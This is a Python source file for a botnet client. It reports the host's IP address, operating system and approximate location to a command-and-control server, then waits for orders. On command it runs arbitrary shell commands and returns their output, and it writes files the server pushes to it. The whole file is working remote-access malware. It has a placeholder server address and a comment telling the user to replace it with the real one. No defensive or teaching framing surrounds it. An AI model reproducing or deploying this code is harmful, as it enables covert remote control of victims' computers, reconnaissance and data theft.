import socket
import platform
import requests
from geopy.geocoders import Nominatim
import os
import json
import subprocess

CNC_SERVER = "127.0.0.1"  # Replace with the actual CNC server's IP address
CNC_PORT = 6666           # Port the CNC server is listening on

def get_country_code():
    """
    Fetch the bot's country code using an external API.
    """
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        return data.get("country", "Unknown")
    except Exception:
        return "Unknown"

def get_location(country_code):
    """
    Resolve the latitude and longitude for a given country code using geopy.
    """
    try:
        geolocator = Nominatim(user_agent="bot_client")
        location = geolocator.geocode(country_code)
        if location:
            return location.latitude, location.longitude
    except Exception:
        pass
    return None, None

def send_bot_info(sock):
    """
    Send bot details (IP, OS, country code, latitude, longitude) to the CNC server.
    """
    try:
        ip = socket.gethostbyname(socket.gethostname())
        os_info = f"{platform.system()} {platform.release()}"
        country_code = get_country_code()
        latitude, longitude = get_location(country_code)

        bot_info = {
            "ip": ip,
            "os": os_info,
            "country_code": country_code,
            "latitude": latitude,
            "longitude": longitude
        }
        sock.sendall(json.dumps(bot_info).encode())
    except Exception as e:
        print(f"Error sending bot info: {e}")

def handle_commands(sock):
    """
    Receive and handle commands from the CNC server.
    """
    try:
        while True:
            data = sock.recv(4096).decode()
            if not data:
                break

            command = json.loads(data)
            action = command.get("action")
            response = {}

            if action == "execute_command":
                cmd = command.get("command")
                try:
                    result = subprocess.check_output(cmd, shell=True, text=True)
                    response = {"output": result}
                except subprocess.CalledProcessError as e:
                    response = {"error": str(e)}

            elif action == "upload_file":
                filename = command.get("filename")
                with open(filename, "wb") as f:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        f.write(chunk)
                response = {"message": f"File {filename} uploaded successfully."}

            else:
                response = {"error": "Unknown action"}

            if response:
                sock.sendall(json.dumps(response).encode())
    except Exception as e:
        print(f"Error handling commands: {e}")
    finally:
        sock.close()

def main():
    """
    Connect to the CNC server and handle incoming commands.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((CNC_SERVER, CNC_PORT))
            print(f"Connected to CNC Server at {CNC_SERVER}:{CNC_PORT}")

            # Send bot info to the CNC server
            send_bot_info(s)

            # Handle commands from the CNC server
            handle_commands(s)

    except Exception as e:
        print(f"Error connecting to CNC server: {e}")

if __name__ == "__main__":
    main()